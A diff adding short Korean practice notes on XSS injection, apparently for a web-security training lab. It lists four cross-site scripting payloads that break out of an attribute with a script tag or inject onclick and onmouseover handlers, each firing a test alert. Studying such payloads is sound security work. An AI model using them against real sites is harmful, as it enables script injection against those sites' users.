@@ -1,0 +1,21 @@
+ 5) XSS 인젝션
+
+ ① 
+
+kim><script>alert("test1")</script>
+
+
+ ② 
+
+
+kim><script>alert("test1")</script><a href=xss_href-3.php?movie=1&name=kim
+
+
+ ③ 
+
+kim onclick="alert('test1')"
+
+
+ ④ 
+
+kim onmouseover="alert('test1')"
